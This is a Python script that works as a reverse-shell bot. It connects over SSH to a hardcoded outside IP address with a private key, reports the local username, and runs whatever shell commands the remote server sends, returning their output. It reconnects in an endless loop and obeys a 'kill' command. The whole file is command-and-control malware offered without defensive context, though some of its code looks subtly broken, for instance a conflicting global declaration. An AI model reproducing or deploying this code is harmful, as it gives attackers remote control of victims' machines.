#!/usr/bin/env python3


import os
import sys
import time
import signal
import threading
import paramiko
import subprocess

ssh_client = None
ssh_session = None
process = None

def exit_gracefully():
    global ssh_client, ssh_session, process
    

    if ssh_session and ssh_session.active:
        ssh_session.close()
    
    if ssh_client:
        ssh_client.close()
    
    if process and process.poll() is None:
        process.terminate()
        process.wait()

    sys.exit(0)

def signal_handler(sig, frame):
    exit_gracefully()

signal.signal(signal.SIGINT, signal_handler)


def exec_underlying_command(command):
    if isinstance(command, bytes):
        command = command.decode()

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    result = None
    if process.returncode == 0:
        result = stdout.decode()
    else:
        result = stderr.decode()

    return result.strip('\n')

command = "whoami".encode()
user = exec_underlying_command(command)


timeout = False
def max_timeout(seconds=10):
    global timeout
    time.sleep(seconds)
    timeout = True



def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
    global ssh_client, ssh_session, user
    ssh_client = paramiko.SSHClient()

    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    private_key = paramiko.RSAKey.from_private_key_file(key_file)
    
    ssh_client.connect(ip, username=user, pkey=private_key, port=port)

    ssh_session = ssh_client.get_transport().open_session()
        
    server_instructions = None

    if ssh_session.active:
        timeout_thread =  threading.Thread(target=max_timeout, args=())
        ssh_session.send(bot_user.encode())

        server_instructions = ssh_session.recv(1024).decode().strip()

        if server_instructions:

            if server_instructions == 'kill':
                exit_gracefully()

            if timeout == True:
                ssh_session.close()
                ssh_client.close()

                try:
                    ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
                except Exception as e:
                    pass

                return

            try:
                response = exec_underlying_command(server_instructions)
            except Exception as e:
                response = e

            ssh_session.send(response.encode())


            ssh_session.close()
            ssh_client.close()
            return
            
    time.sleep(1)


if __name__ == "__main__":

    global user

    while True:
        try:
            ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
        except Exception as e:
            pass

        time.sleep(0.5)
